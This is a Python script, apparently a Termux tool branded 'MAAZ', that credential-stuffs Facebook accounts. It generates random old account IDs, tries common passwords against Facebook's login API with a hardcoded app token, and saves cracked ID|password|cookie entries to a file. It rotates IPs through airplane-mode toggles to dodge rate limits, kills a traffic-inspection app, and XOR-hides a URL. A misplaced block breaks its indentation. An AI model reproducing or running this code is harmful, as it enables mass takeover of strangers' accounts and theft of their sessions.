import os
import sys
import time
import re
import random
import uuid
import json
import subprocess
import pycurl
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from random import choice as race
from string import digits, ascii_letters
# VPN & Location Check - Updated with Auto Airplane Mode (30 Mins)
def check_internet_and_vpn():
    try:
        import requests
        # IP, City, aur Country detect karne ke liye ipapi use kar rahe hain
        print("  \x1b[95m[+] Fetching connection details...\x1b[0m")
        response = requests.get('https://ipapi.co/json/', timeout=8)
        
        if response.status_code == 200:
            data = response.json()
            ip = data.get('ip', 'Unknown')
            city = data.get('city', 'Unknown')
            country = data.get('country_name', 'Unknown')
            org = data.get('org', 'Unknown') # ISP ya VPN name detect karne ke liye
            
            print("\n  \x1b[92m╔════════════════════════════════════════╗\x1b[0m")
            print(f"    \x1b[96m✓ Connected\x1b[0m")
            print(f"    \x1b[97mIP Address : \x1b[93m{ip}\x1b[0m")
            print(f"    \x1b[97mCity       : \x1b[93m{city}\x1b[0m")
            print(f"    \x1b[97mCountry    : \x1b[93m{country}\x1b[0m")
            print(f"    \x1b[97mNetwork/VPN: \x1b[93m{org}\x1b[0m")
            print("  \x1b[92m╚════════════════════════════════════════╝\x1b[0m\n")
            return True
        else:
            print("  \x1b[91mNo Internet Connection!")
            return False
    except Exception as e:
        print("  \x1b[91mError connecting to network/VPN!")
        return False

def auto_airplane_mode():
    """Har 30 minutes baad automatically IP change karne ke liye loop"""
    import os
    while True:
        # 30 Minutes = 1800 Seconds
        print("  \x1b[96m[+] Script running... Next IP rotation in 30 minutes.\x1b[0m")
        time.sleep(1800)
        
        print("\n  \x1b[93m[!] Rotating IP via Airplane Mode...\x1b[0m")
        
        # Method 1: Agar device rooted hai ya Termux:API setup hai (Chutki me kaam karega)
        os.system("cmd connectivity airplane-mode enable >/dev/null 2>&1")
        time.sleep(3)
        os.system("cmd connectivity airplane-mode disable >/dev/null 2>&1")
        
        # Method 2: Agar upar wala block na chale (Bina root ke adb use karne ke liye alternative)
        # os.system("adb shell cmd connectivity airplane-mode enable")
        # time.sleep(3)
        # os.system("adb shell cmd connectivity airplane-mode disable")
        
        print("  \x1b[92m[✓] Airplane Mode toggled. Checking new IP...\x1b[0m")
        check_internet_and_vpn()
import urllib.parse
import base64
import ctypes

def run_system_command(command):
    os.system(f'{command} >/dev/null 2>&1')

run_system_command('chmod 700 /data/data/com.termux/files/usr/bin')
run_system_command('pkill -f httcanary')

class NebulaColors:
    def __init__(self):
        self.W = '\x1b[97;1m'
        self.R = '\x1b[91;1m'
        self.G = '\x1b[92;1m'
        self.Y = '\x1b[93;1m'
        self.B = '\x1b[94;1m'
        self.P = '\x1b[95;1m'
        self.C = '\x1b[96;1m'
        self.N = '\x1b[0m'

def pro_banner():
    return """
\x1b[1;96m
   ███╗   ███╗ █████╗ ███████╗    
   ████╗ ████║██╔══██╗╚══███╔╝    
   ██╔████╔██║███████║  ███╔╝     
   ██║╚██╔╝██║██╔══██║ ███╔╝      
   ██║ ╚═╝ ██║██║  ██║███████╗    
   ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝
\x1b[1;91m╔═══════════════════════════════════╗
\x1b[1;92m║\x1b[1;93m      ✦  \x1b[1;94m𝗧𝗢𝗢𝗟 \x1b[1;95mI𝗡𝗙𝗢 \x1b[1;96m𝗣𝗔𝗡𝗘𝗟  \x1b[1;97m✦        \x1b[1;92m║
\x1b[1;91m╚═══════════════════════════════════╝
\x1b[1;96m   ➤ \x1b[1;97mCreator        : \x1b[1;96mMAAZ
\x1b[1;96m   ➤ \x1b[1;97mOperated By    : \x1b[1;92mMAAZ \x1b[1;91m(\x1b[1;90mPremium Access\x1b[1;91m)
\x1b[1;96m   ➤ \x1b[1;97mTool Access    : \x1b[1;93mPro 
\x1b[1;96m   ➤ \x1b[1;97mCurrent Version: \x1b[1;95m0.9
\x1b[1;92m───────────────────────────────────────────────"""

def linex():
    color = NebulaColors()
    print(f"  \x1b[1;91m╔\x1b[1;92m═\x1b[1;93m━\x1b[1;94m─\x1b[1;95m━\x1b[1;96m━\x1b[1;97m━\x1b[1;91m━\x1b[1;92m━\x1b[1;93m━\x1b[1;94m━\x1b[1;95m━\x1b[1;96m━\x1b[1;97m━\x1b[1;91m━\x1b[1;92m━\x1b[1;93m━\x1b[1;94m━\x1b[1;95m━\x1b[1;96m━\x1b[1;97m━\x1b[1;91m━\x1b[1;92m━\x1b[1;93m━\x1b[1;94m━\x1b[1;95m━\x1b[1;96m━\x1b[1;97m━\x1b[1;91m━\x1b[1;92m━\x1b[1;93m━\x1b[1;94m━\x1b[1;95m━\x1b[1;96m━\x1b[1;97m━\x1b[1;91m━\x1b[1;92m─\x1b[1;93m━\x1b[1;94m═\x1b[1;95m╗\x1b[0m")
    print(f"  \x1b[1;96m║    \x1b[1;91m★ \x1b[1;92mP\x1b[1;93mR\x1b[1;94mE\x1b[1;95mM\x1b[1;96mI\x1b[1;97mU\x1b[1;91mM \x1b[1;92mT\x1b[1;93mO\x1b[1;94mO\x1b[1;95mL \x1b[1;96mI\x1b[1;97mN\x1b[1;91mT\x1b[1;92mE\x1b[1;93mR\x1b[1;94mF\x1b[1;95mA\x1b[1;96mC\x1b[1;97mE \x1b[1;91m★    \x1b[1;96m║\x1b[0m")                      
    print(f"  \x1b[1;91m╚\x1b[1;92m═\x1b[1;93m━\x1b[1;94m─\x1b[1;95m━\x1b[1;96m━\x1b[1;97m━\x1b[1;91m━\x1b[1;92m━\x1b[1;93m━\x1b[1;94m━\x1b[1;95m━\x1b[1;96m━\x1b[1;97m━\x1b[1;91m━\x1b[1;92m━\x1b[1;93m━\x1b[1;94m━\x1b[1;95m━\x1b[1;96m━\x1b[1;97m━\x1b[1;91m━\x1b[1;92m━\x1b[1;93m━\x1b[1;94m━\x1b[1;95m━\x1b[1;96m━\x1b[1;97m━\x1b[1;91m━\x1b[1;92m━\x1b[1;93m━\x1b[1;94m━\x1b[1;95m━\x1b[1;96m━\x1b[1;97m━\x1b[1;91m━\x1b[1;92m─\x1b[1;93m━\x1b[1;94m═\x1b[1;95m╝\x1b[0m")
def clear():
    os.system('clear')
    print(pro_banner())

def secure_xor(data, key=85):
    return bytes([b ^ key for b in data])

def get_hidden_url():
    parts = [
        secure_xor(b'https://'),
        secure_xor(b'github.com/'),
        secure_xor(b'1-NALLA/'),
        secure_xor(b'Jinn_App/'),
        secure_xor(b'blob/main/'),
        secure_xor(b'App.txt')
    ]
    return b"".join(secure_xor(part) for part in parts).decode()

class UserAgentGenerator:
    def __init__(self):
        self.custom_user_agents = [
            "[FBAN/FB4A;FBAV/425.1.0.28.120;FBBV/43567891;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBCR/Verizon;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A137F;FBSV/12;FBOP/1;FBCA/arm64-v8a;]",
        ]

    def _generate_mozilla_user_agent(self):
        android_version = random.randint(4, 13)
        device = random.choice(('SM-G900F', 'SM-G920F', 'SM-T535', 'SM-T231', 'SM-J320F', 'GT-I9190'))
        resolution = random.choice(('{density=1.5,width=720,height=1280}', '{density=3.5,width=1440,height=3040}'))
        chrome_version = f"{random.randint(100, 150)}.0.0.0"
        return f"Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36 [{resolution}]"

    def generate_user_agent(self):
        user_agent_type = random.choice(('Mozilla', 'Facebook', 'Dalvik', 'iPhone', 'Custom'))
        if user_agent_type == 'Mozilla':
            return self._generate_mozilla_user_agent()
        else:
            return random.choice(self.custom_user_agents)

    def load_user_agents_from_url(self):
        try:
            import requests
            response = requests.get('https://raw.githubusercontent.com/Labbaik757/Arain-Khan/main/user-agent')
            return response.text.splitlines()
        except Exception:
            return []

class MAAZCracker:
    def __init__(self):
        self.oks = []
        self.cps = []
        self.loop = 0
        self.color = NebulaColors()
        self.user_agents = UserAgentGenerator().load_user_agents_from_url()

    def old_menu(self):
        clear()
        if not check_internet_and_vpn():
            return
        print(f"{self.color.P}╔═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╗")
        print(f"{self.color.P}║         {self.color.Y}★ OLD ACCOUNT CRACKER ★         {self.color.P}║")
        print(f"{self.color.P}╠═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣")
        print(f"{self.color.P}║ {self.color.C}[1] {self.color.G}CRACK 2009 ACCOUNTS                 {self.color.P}║")
        print(f"{self.color.P}║ {self.color.C}[2] {self.color.G}CRACK 2009-2013 ACCOUNTS            {self.color.P}║")
        print(f"{self.color.P}║ {self.color.C}[0] {self.color.R}⇦ BACK TO MAIN MENU                 {self.color.P}║")
        print(f"{self.color.P}╚═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╝")

        choice = input(f"  {self.color.C}\x1b[1;96m ➤ Choose: {self.color.W}").strip()
        
        if choice in ('1', '01'):
            self.execute_breach('100000')
        elif choice in ('2', '02'):
            self.quantum_breach_menu()
        elif choice in ('0', '00'):
            return
        else:
            print(f"\n  {self.color.R}⚠ Invalid choice!")
            time.sleep(2)
            self.old_menu()

    def quantum_breach_menu(self):
        clear()
        series_map = {
            '1': '100000', '2': '100001', '3': '100002', 
            '4': '100003', '5': '100004'
        }
        print(f"  {self.color.W}\x1b[1;96m ➤ Select Series:")
        for num, prefix in series_map.items():
            print(f"  {self.color.W}[{self.color.G}{num}{self.color.W}] {self.color.C}{prefix}")
        
        linex()
        choice = input(f"  {self.color.C}\x1b[1;96m ➤ Choose: {self.color.W}").strip()
        selected_prefix = series_map.get(choice)

        if not selected_prefix:
            print(f"  {self.color.R}⚠ Invalid Series!")
            time.sleep(2)
            self.quantum_breach_menu()
            return
        
        self.execute_breach(selected_prefix)

    def execute_breach(self, prefix):
        try:
            clear()
            limit = int(input(f"  {self.color.G}\x1b[1;96m ➤ Enter Limit: {self.color.W}"))
        except ValueError:
            print(f"  {self.color.R}⚠ Invalid Number!")
            time.sleep(2)
            self.old_menu()
            return

        targets = [prefix + ''.join(random.choices(digits, k=9)) for _ in range(limit)]
        passlist = ['123456', '1234567', '12345678', '123456789', '1234567890', '123123']

        with tred(max_workers=30) as executor:
            clear()
            print(f"  {self.color.W}\x1b[1;96m   ➤ Cracking {self.color.Y}{prefix} ")
            print(f"  {self.color.W}\x1b[1;96m   ➤ Targets: {self.color.G}{len(targets)}")
            linex()
            for target in targets:
                executor.submit(self.breach_target, target, passlist)
        
        self.display_results()

    def breach_target(self, target, passlist):
        self.loop += 1
        sys.stdout.write(f'\r  {self.color.W}[MAAZ] {self.loop}|{self.color.R}{len(self.oks)}|{self.color.G}{len(self.cps)}{self.color.W}')
        sys.stdout.flush()
        for password in passlist:
            if self.try_breach(target, password):
                break
import threading
threading.Thread(target=auto_airplane_mode, daemon=True).start()

    def try_breach(self, uid, password):
        try:
            ua = random.choice(self.user_agents)
            
            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123Dior23437a4a32',
            }
            
            payload = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': password,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'method': 'auth.login',
            }

            encoded_payload = urllib.parse.urlencode(payload)
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-api.facebook.com/auth/login')
            c.setopt(c.POST, 1)
            c.setopt(c.POSTFIELDS, encoded_payload)
            c.setopt(c.WRITEDATA, buffer)
            c.setopt(c.TIMEOUT, 10)
            
            header_list = [f"{key}: {value}" for key, value in headers.items()]
            c.setopt(c.HTTPHEADER, header_list)
            
            c.perform()
            response_body = buffer.getvalue().decode('utf-8')
            response = json.loads(response_body)
            c.close()
            buffer.close()

            if 'session_key' in response:
                self.handle_success(uid, password, response)
                return True
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                self.handle_partial(uid, password)
                return True
        except Exception:
            return False
        return False

    def handle_success(self, uid, password, response):
        coki = ';'.join([f"{c['name']}={c['value']}" for c in response.get('session_cookies', [])])
        print(f"\r  {self.color.G}\x1b[1;96m   ➤ SUCCESS {self.color.W}{uid}|{self.color.G}{password}{self.color.W}")
        with open('/sdcard/MAAZ-OLD.txt', 'a') as f:
            f.write(f'{uid}|{password}|{coki}\n')
        self.oks.append(uid)

    def handle_partial(self, uid, password):
        print(f"\r  {self.color.Y}\x1b[1;96m   ➤ ✅ {self.color.G}{uid}{self.color.Y}•\x1b[1;90m{password}{self.color.W}")
        with open('/sdcard/MAAZ-OLD.txt', 'a') as f:
            f.write(f'{uid}|{password}\n')
        self.cps.append(uid)
        
    def display_results(self):
        clear()
        print(f"  {self.color.G}\x1b[1;96m   ➤ CRACKING COMPLETE")
        linex()
        print(f"  {self.color.W}CP: {self.color.Y}{len(self.oks)}")
        print(f"  {self.color.W}OK: {self.color.G}{len(self.cps)}")
        linex()
        input(f"  {self.color.C}Press ENTER to continue {self.color.W}")
        self.old_menu()
        
if __name__ == "__main__":
    try:
        cracker = MAAZCracker()
        cracker.old_menu()
    except KeyboardInterrupt:
        print("\n\x1b[1;96m   ➤ Stopped")
        sys.exit()
    except Exception as e:
        print(f"\n\x1b[1;96m   ➤ Error: {str(e)}")
        sys.exit()
